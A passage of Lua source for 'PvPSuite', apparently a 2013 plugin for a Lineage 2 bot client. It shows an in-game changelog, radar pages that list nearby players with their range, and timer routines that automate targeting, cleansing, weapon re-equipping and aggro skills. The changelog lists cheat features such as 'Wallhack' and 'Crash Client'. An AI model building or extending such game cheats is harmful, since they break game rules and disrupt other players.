			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Spy Hide". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Auto Detection(AoE)". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Interrupt Elemental Heal". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Interrupt Talismans". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Near Players". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Auto SS(S-Grade)". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed "Olympiad Informer". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed "Inform Name/Clan/Class". <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.9</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Auto SS(S-Grade)". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Protections". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Auto Riposte Stance". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Auto Self Cleanse". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Stats". <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.8</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Stats". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="8000FF">~</font> Replaced Licensing System. <font color="8000FF">~</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.7</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Auto Message On Kill". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "'.."Creator's Pick"..'". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Commands". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Send Encrypted Message". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Inform Name/Clan/Class". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Class On Title". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Crash Client". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Renamed "Fun" to "Other". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Changed "Spam Chat(No CB)". <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.6</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Olympiad Informer". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Interrupt Talismans". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "YouTube". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Random Quote". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Wallhack". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Show FPS". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Show Net Stats". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed "Auto Riposte Stance". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Barrer Fix". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Informer(Skills)". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved '.."Don't"..' Run From Fear. <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Critical changes to the plugin base. <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.5</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Radar". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Anti Deadly". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Auto Riposte Stance". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed some crashes. <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.4</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Damage Counter". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Aggro Bot". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Auto Self Cleanse". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved "Interrupt Elemental Heal". <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed minor bugs. <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.3</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Auto Riposte Stance". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed a Tic Tac Toe party bug. <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Improved Anti-Disarm. <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.2</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Pause PvPSuite" option. <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Target Equipment". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added "Mini Games" - "Tic Tac Toe". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added In-Game "Changelog". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Redesigned sub menus. <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Made some critical efficiency improvements. <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="8000FF">~</font> Version made available to the public.<font color="8000FF">~</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.1</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="13D230">+</font> Added "Auto Detection(AoE)". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="13D230">+</font> Added In-Game "Contact Info". <font color="13D230">+</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed some important ABA issues. <font color="FF8040">!</font>');
			html:AddHtml('</ br><font color="FF8040">!</font> Fixed Anti Disarm stuck with paralyze debuffs. <font color="FF8040">!</font>');
			html:AddHtml("</td></tr></table>");
			html:AddHtml('</ br><font color="D51E87">Version 1.0</font></ br>');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('</ br><font color="8000FF">~</font> Initial version released to beta testers. <font color="8000FF">~</font>');
			html:AddHtml("</td></tr></table>");
	elseif (action == "Mini Games") then
			Condition = false;
			if (TTT[2]) then
				Condition = true;
			end;		
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/dogame"):AddParam("Tic Tac Toe"),THtmlButtonStyle.BUTTON_EXTRA, "Tic Tac Toe",Condition,"","",120,25);
			html:AddHtml("</td></tr></table>");	
	elseif (action == "Radar(PK/War/PvP Only)") then
			local warPlayers = {};
			local flagPlayers = {};
			local PKPlayers = {};
			html:AddButton(THtmlAction("/doaction"):AddParam("Radar(PK/War/PvP Only)"),THtmlButtonStyle.BUTTON_ACTION, "Reload",false,"","",60,21);
			html:AddHtml('<table width=300><tr><td><table width=300><tbody>');
			local players = GetPlayerList();
			for user in players.list do
				if ((Me:GetRangeTo(user) < 3500) and (user:GetShopStatus() == 0) and (user:IsFriend() == false)) then
					if (user:GetReputation() < 0) then
							PKPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (user:IsClanWar2Side()) then
							warPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (user:IsPvPFlag()) then
							flagPlayers[user:GetName()]=Me:GetRangeTo(user);
					end;
				end;
			end;
			if ((tableLength(flagPlayers) > 0) or (tableLength(warPlayers) > 0) or (tableLength(PKPlayers) > 0)) then
				html:AddHtml('<tr><td><font color="AD5BFF">Name</font></td><td><font color="AD5BFF">Range</font></td></tr>');
			else
				html:AddHtml('<tr><td><center><font color="FF0000">Nothing found :(</font></center></td></tr>');
			end;
			if (tableLength(PKPlayers) > 0) then
				for playerName, Range in Orderize(PKPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="FF0000">'..playerName..'</font></td></tr></table></td> <td><font color="FF0000">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(warPlayers) > 0) then
				for playerName, Range in Orderize(warPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="FFFF00">'..playerName..'</font></td></tr></table></td> <td><font color="FFFF00">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(flagPlayers) > 0) then
				for playerName, Range in Orderize(flagPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="fb00fb">'..playerName..'</font></td></tr></table></td> <td><font color="fb00fb">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			html:AddHtml('</tbody></table></td></tr></table>');
			warPlayers = {};
			PKPlayers = {};
			flagPlayers = {};
	elseif (action == "Radar") then
			local whitePlayers = {};
			local deadPlayers = {};
			local flagPlayers = {};
			local warPlayers = {};
			local PKPlayers = {};
			local partyPlayers = {};
			local clanPlayers = {};
			local allyPlayers = {};
			html:AddButton(THtmlAction("/radar"),THtmlButtonStyle.BUTTON_ACTION, "Reload",false,"","",60,21);
			html:AddHtml('<table width=300><tr><td><table width=300><tbody>');
			local players = GetPlayerList();
			for user in players.list do
				if ((Me:GetRangeTo(user) < 1500) and (user:GetShopStatus() == 0)) then
					if (user:IsMyPartyMember()) then
						partyPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (sameClan(user)) then
							clanPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (sameAlly(user)) then
							allyPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (user:GetReputation() < 0) then
							PKPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (user:IsClanWar2Side()) then
							warPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (user:IsPvPFlag()) then
							flagPlayers[user:GetName()]=Me:GetRangeTo(user);
					elseif (user:IsAlikeDeath()) then
							deadPlayers[user:GetName()]=Me:GetRangeTo(user);
					else
						whitePlayers[user:GetName()]=Me:GetRangeTo(user);
					end;
				end;
			end;
			if ((tableLength(whitePlayers) > 0) or (tableLength(deadPlayers) > 0) or (tableLength(flagPlayers) > 0) or (tableLength(warPlayers) > 0) or (tableLength(PKPlayers) > 0) or (tableLength(partyPlayers) > 0) or (tableLength(clanPlayers) > 0) or (tableLength(allyPlayers) > 0)) then
				html:AddHtml('<tr><td><font color="AD5BFF">Name</font></td><td><font color="AD5BFF">Range</font></td></tr>');
			else
				html:AddHtml('<tr><td><center><font color="FF0000">Nothing found :(</font></center></td></tr>');
			end;
			if (tableLength(PKPlayers) > 0) then
				for playerName, Range in Orderize(PKPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="FF0000">'..playerName..'</font></td></tr></table></td> <td><font color="FF0000">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(warPlayers) > 0) then
				for playerName, Range in Orderize(warPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="FFFF00">'..playerName..'</font></td></tr></table></td> <td><font color="FFFF00">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(flagPlayers) > 0) then
				for playerName, Range in Orderize(flagPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="fb00fb">'..playerName..'</font></td></tr></table></td> <td><font color="fb00fb">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(partyPlayers) > 0) then
				for playerName, Range in Orderize(partyPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="01fa01">'..playerName..'</font></td></tr></table></td><td><font color="01fa01">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(clanPlayers) > 0) then
				for playerName, Range in Orderize(clanPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="7c76fc">'..playerName..'</font></td></tr></table></td><td><font color="7c76fc">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(allyPlayers) > 0) then
				for playerName, Range in Orderize(allyPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="77ff99">'..playerName..'</font></td></tr></table></td><td><font color="77ff99">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(whitePlayers) > 0) then
				for playerName, Range in Orderize(whitePlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td>'..playerName..'</td></tr></table></td><td>'..Round(Range)..'</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			if (tableLength(deadPlayers) > 0) then
				for playerName, Range in Orderize(deadPlayers) do
					html:AddHtml('<tr><td><table width=110><tr><td><font color="555555">'..playerName..'</font></td></tr></table></td><td><font color="555555">'..Round(Range)..'</font></td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("ShowInfo"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, "i",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('<td>');
					html:AddButton(THtmlAction("/radar"):AddParam("Target"):AddParam(playerName),THtmlButtonStyle.BUTTON_ACTION, ">",false,"","",20,20);
					html:AddHtml('</td>');
					html:AddHtml('</tr>');
				end;
			end;
			html:AddHtml('</tbody></table></td></tr></table>');
			whitePlayers = {};
			deadPlayers = {};
			warPlayers = {};
			PKPlayers = {};
			flagPlayers = {};
			partyPlayers = {};
			clanPlayers = {};
			allyPlayers = {};
		else
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=290><tr><td align=center valign=center width=236>");
			html:AddHtml('<center><font color="FF0000">Error 404!</font></center></ br>');
			html:AddHtml('<center><font color="FF8040">The page you are looking for does not exist.</font></center>');
			html:AddHtml("</td></tr></table></ br></ br>");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236>");
			html:AddHtml('<center>If you think that this is a plugin error</center></ br>');
			html:AddHtml('<center>Please report it!</center></ br>');
			html:AddButton(THtmlAction("/doaction"):AddParam("Contact Info"),THtmlButtonStyle.BUTTON_ACTION, "Contact Info",false,"","",100,30);
			html:AddHtml("</td></tr></table>");
	end;
	if ((action ~= "Radar") and (action ~= "Radar(PK/War/PvP Only)")) then
		html:AddHtml('<img src="L2UI_CH3.herotower_deco" width=256 height=32 align=left>');
	end;
	html:AddHtml("</ br></ br>");
	if	(Param ~= "") then
		html:AddButton(THtmlAction("/pvpsuite"):AddParam(Param),THtmlButtonStyle.BUTTON_ACTION, "Go back",false,"","",120,21);
	else
		html:AddButton(THtmlAction("/pvpsuite"),THtmlButtonStyle.BUTTON_ACTION, "Go back",false,"","",120,21);
	end;
	html:AddHtml('</br ><font color="555555">PvPSuite '..PvPSuiteV..' - 2013</font>');
	html:AddHtml('</center>');
	HtmlBuild = html:GetString();	
	ShowHtmlStatus = true;
end;
function EncryptLicense(kllVSAExDH)
	return kllVSAExDH;
end;
function OnLTick()
	if (PvPSuite[34]) then
		if (GetTarget() == nil) then
			if ((LastTargeted ~= "") and (LastTargeted ~= nil)) then
				if (GetUserByName(LastTargeted) ~= nil) then
					RawTarget(LastTargeted);
				end;
			end;
		elseif (GetTarget():GetName() ~= MyName) then
				if (GetTarget():GetName() ~= LastTargeted) then
					if ((LastTargeted ~= "") and (LastTargeted ~= nil)) then
						if (GetUserByName(LastTargeted) ~= nil) then
							RawTarget(LastTargeted);
						end;
					end;
				end;
		end;	
	end;
end;
function OnLTick500ms()
	if (ShowHtmlStatus) then
		if ((MoveTitle) or (FlashTitleFast) or (FlashTitleSlow)) then
			ShowSafeHtml = true;
		else
			if (ShowSafeHtml == false) then
				ShowHtmlStatus = false;
				ShowHtml(HtmlBuild);
			else
				ShowToClient("Title Effects","Please wait while I'm safely turning off title effects and processing your command!");
				ShowHtmlStatus = false;
			end;
		end;
	end;
	if (showDecryptedMsg) then
		if (Timer[19] == 1) then
			showDecryptedMsg = false;
			Timer[19] = 0;
			ShowToClient(whoSaidEnc.."(ENCRYPTED)",DecryptMessage(encMsg));
		else
			Timer[19] = 1;
		end;
	end;
end;
function OnLTick1s()
	if (clearAutoRes) then
		if (Timer[7] == 1) then
			clearAutoRes = false;
			autoRessing = false;
		else
			Timer[7] = 1;
		end;
	end;
	if (PvPSuite[64]) then
		if ((checkingDeads == false) and (autoRessing == false)) then
			checkingDeads = true;
			checkDeadPTMember();
		end;
	end;
	if (delayAggro) then
		if (delayAggroC == 10) then
			delayAggroC = 0;
			delayAggro = false;
		else
			delayAggroC = delayAggroC + 1;
		end;
	end;
	if (showDelayedMsgs) then
		if (delayedC == 10) then
			randomGeneratedCommand = randomStringGenerator(3,5);
			ShowToClient("Random PMC Generated",tostring(randomGeneratedCommand));
			delayedC = 11;
			showDelayedMsgs = false;
		else
			delayedC = delayedC + 1;
		end;
	end;
	if (Counting) then
		Counter = Counter - 1;
		if (Counter == 0) then
			Command("GO!");
			Counting = false;
			Counter = 9;
		elseif (Counter < 6) then
				Command(tostring(Counter));
		end;
	end;
	if (PvPSuite[6]) then
		if (iGotBuff(FearSkills)) then
			Unstuck();
			fearUnstucking = true;
		else
			if (fearUnstucking) then
				CancelTarget(true);
				fearUnstucking = false;
			end;
		end;
	end;
	if (BPaused) then
		if (Timer[1] == 2) then
			if (iGotBuff(BarrierSkills) ~= true) then
				SetPause(false);
				BPaused = false;
			end;
			Timer[1] = 0;
		else
			Timer[1] = Timer[1] + 1;
		end;
	end;
	if (PvPSuite[32]) then
		if (Timer[2] == 1) then
			if (GetTarget() ~= nil) then
				if (GetTarget():IsFriend() == false) then
					local aggroSkill = GetSkills():FindById(getAggroSk());
					if (GetMe():GetRangeTo(GetTarget()) < 800) then
						if (aggroSkill:CanBeUsed()) then
							UseSkillRaw(getAggroSk(),false,false);
						end;
					end;
				end;
			end;
			Timer[2] = 0;
		else
			Timer[2] = 1;
		end;
	end;
	if ((PvPSuite[14]) or (PvPSuite[15])) then
		if (Timer[3] == 5) then
			if (GetTarget() ~= nil) then
				if (GetTarget():IsMe() == false) then
					local partyList = GetPartyList();
					for user in partyList.list do
						if (PvPSuite[14]) then
							if ((Me:GetRangeTo(user) < 800) and (user:IsAlikeDeath() == false)) then
								if (user:GetTarget() ~= Me:GetTarget()) then
									ShowToClient("MA",user:GetName() .. " is not assisting you!");
								end;
							end;
						end;
						if (PvPSuite[15]) then
							if ((Me:GetRangeTo(user) > 1000) and (user:IsAlikeDeath() == false) and (Me:GetRangeTo(user) < 2500)) then
								if (user:GetTarget() ~= Me:GetTarget()) then
									ShowToClient("MA",user:GetName() .. " is too far from you!");
								end;
							end;
						end;
					end;
				end;
			end;
			Timer[3] = 0;
		else
			Timer[3] = Timer[3] + 1;
		end;
	end;
	if ((ShowEachMin) or (ShowPMEachMin)) then
		if (Timer[4] == 60) then
			if (ShowEachMin) then
				DoDialog("Damage Counter");
			end;
			if (ShowPMEachMin) then
				ShowToClient("Total Damage Done",tostring(damageDone));
				ShowToClient("Total Damage Received",tostring(damageReceived));
			end;
			Timer[4] = 0;
		else
			Timer[4] = Timer[4] + 1;
		end;
	end;
	if ((SpyingRevealed) and (IsPremium())) then
		if (Timer[6] == 2) then
			if (GetUserByName(HiddenUser) ~= nil) then
				ShowArrow(GetUserByName(HiddenUser):GetLocation());
				ShowToClient("Premium",HiddenUser.." gone off hide!");
				HiddenUser = "";
				SpyingHidden = false;
				SpyingRevealed = false;
				Timer[6] = 0;
			end;
		else
			Timer[6] = Timer[6] + 1;
		end;
	end;
	if ((SpyingHidden) and (SpyingRevealed == false)) then
		if (Timer[5] == 63) then
			ShowToClient("Premium",HiddenUser.." gone out of sight!");
			HiddenUser = "";
			SpyingHidden = false;
			Timer[5] = 0;
		else
			Timer[5] = Timer[5] + 1;
		end;
	end;
	if (safeShowHtml) then
		if (Timer[8] == 0) then
			local Location = Me:GetLocation();
			MoveToNoWaitF(Location.X+1, Location.Y, Location.Z);
			Timer[8] = 1;
		elseif (Timer[8] == 9) then
				ShowHtml(HtmlBuild);
				safeShowHtml = false;
				ShowSafeHtml = false;
				Timer[8] = 0;
		else
			Timer[8] = Timer[8] + 1;
		end;
	end;
	if ((checkingDebuffLand) and (BPaused == false)) then
		if (Timer[9] == 1) then
			if ((iGotBuff(targetDebuffsList)) or (iGotBuff(aoeDebuffsList)) or (iGotBuff(DisarmSkills))) then
				if (canIuse(getCleanse())) then
					RawTarget(MyName);
					if (GetTarget() ~= nil) then
						if (GetTarget():IsMe()) then
							UseSkillRaw(getCleanse(),false,false);
							targetLastTargeted = true;
							PvPSuite[55] = tonumber(PvPSuite[55])+1;
						end;
					end;
				end;
			else
				if not((iGotBuff(targetDebuffsList)) or (iGotBuff(aoeDebuffsList)) or (iGotBuff(DisarmSkills))) then
					checkingDebuffLand = false;
					Timer[9] = 0;
				end;
			end;
		else
			if ((iGotBuff(targetDebuffsList)) or (iGotBuff(aoeDebuffsList)) or (iGotBuff(DisarmSkills))) then
				if (canIuse(getCleanse())) then
					RawTarget(MyName);
					if (GetTarget() ~= nil) then
						if (GetTarget():IsMe()) then
							UseSkillRaw(getCleanse(),false,false);
							targetLastTargeted = true;
							PvPSuite[55] = tonumber(PvPSuite[55])+1;
						end;
					end;
				end;
			end;
			Timer[9] = 1;
		end;
	end;
	if (mustCheckDebuffLandAgain) then
		if (Timer[10] == 1) then
			checkingDebuffLand = true;
			mustCheckDebuffLandAgain = false;
		else
			Timer[10] = 1;
		end;
	end;
	if (PvPSuite[4]) then
		if (tryingtoWearWep == false) then
			GetWID();
			if ((WeaponID ~= nil) and (ObjectID ~=  nil)) then
				if ((WearingIt()) == false) then
					if (iGotBuff(DisarmSkills)) then
						wearWep = true;
						PvPSuite[53] = tonumber(PvPSuite[53])+1;
					end;
				end;
			end;
		end;
	end;
	if (wearWep) then
		tryingtoWearWep = true;
		wp = GetInventory():FindById(ObjectID);
		if (wp ~= nil) then
			if (wp.IsEquipped) then
				GetWID();
				wearWep = false;
				tryingtoWearWep = false;
			else	
				UseItemRaw(ObjectID);
			end;
		end;
	end;
	if (targetLastTargeted) then
		if (Timer[11] == 1) then
			if (GetTarget() ~= nil) then
				if (GetTarget():IsMe()) then
					if ((LastTargeted ~= "") and (LastTargeted ~= nil)) then
						RawTarget(LastTargeted);
					end;
				else
					if ((LastTargeted ~= "") and (LastTargeted ~= nil)) then
						if (GetTarget():GetName() ~= LastTargeted) then
							RawTarget(LastTargeted);
						end;
					end;
				end;
			else
				if ((LastTargeted ~= "") and (LastTargeted ~= nil)) then
					RawTarget(LastTargeted);
				end;
			end;
			Timer[11] = 0;
			targetLastTargeted = false;
		else
			Timer[11] = 1;
		end;
	end;
	if (TTTDelayedMsgs) then
		if (Timer[12] == 2) then
			ShowToClient("Tic Tac Toe","Started!");
			ShowToClient("Tic Tac Toe","Your opponent is: "..TTT[3]);
			ShowToClient("Tic Tac Toe","Your mark is: "..TTT[7]);
			DoGameDialog("TTT - Playing");
			Timer[12] = 0;
			TTTDelayedMsgs = false;
		else
			Timer[12] = Timer[12] + 1;
		end;
	end;
	if (TTTcoOperate) then
		if (Timer[13] == 2) then
			if (confirmedResponse) then
				ShowToClient("Tic Tac Toe","Started!");
				ShowToClient("Tic Tac Toe","Your opponent is: "..TTT[3]);
				ShowToClient("Tic Tac Toe","Your mark is: "..TTT[7]);
				DoGameDialog("TTT - Playing");
				TTT[4] = true;
				confirmedResponse = false;
			else
				if (TTT[3] ~= nil) then
